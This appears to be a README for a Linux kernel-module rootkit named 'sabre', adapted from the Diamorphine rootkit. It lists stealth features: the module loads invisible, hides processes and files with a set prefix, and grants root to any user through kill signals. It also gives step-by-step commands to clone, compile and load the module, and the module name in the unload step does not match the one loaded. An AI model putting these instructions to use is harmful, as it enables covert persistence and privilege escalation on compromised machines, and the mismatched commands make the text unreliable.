Diamorphine
===========
This is based on Diamorphine for the time being untill we get time to roll our own from scratch.
	- Diamorphine is a LKM rootkit for Linux Kernels 2.6.x/3.x/4.x

Features
--

- When loaded, the module starts invisible;

- Hide/unhide any process by sending a signal 31 with 'kill -31 0';

- Sending a signal 63(to any pid) makes the module become (in)visible;

- Sending a signal 64(to any pid) makes the given user become root;

- Files or directories starting with the MAGIC_PREFIX become invisble, that is currently set in the .h file as 'sscrt';

- Source for Diamorphine: https://github.com/m0nad/Diamorphine

Install
--

Verify if the kernel is 2.6.x/3.x/4.x
```
uname -r
```

Clone the repository
```
git clone https://github.com/sscrt/sabre
```

Enter the folder
```
cd ./sabre/sabre-rt/lin/initial-RT/
```

Compile
```
make
```

Load the module(as root)
```
insmod sabreRT.ko
```

Uninstall
--

The module starts invisible, to remove you need to make its visible
```
kill -63 0
```

Then remove the module(as root)
```
rmmod sat-telem
```

References
--
Wikipedia Rootkit
https://en.wikipedia.org/wiki/Rootkit

Linux Device Drivers
http://lwn.net/Kernel/LDD3/

LKM HACKING
https://www.thc.org/papers/LKM_HACKING.html

Memset's blog
http://memset.wordpress.com/

Linux on-the-fly kernel patching without LKM
http://phrack.org/issues/58/7.html

WRITING A SIMPLE ROOTKIT FOR LINUX
http://big-daddy.fr/repository/Documentation/Hacking/Security/Malware/Rootkits/writing-rootkit.txt

Linux Cross Reference
http://lxr.free-electrons.com/
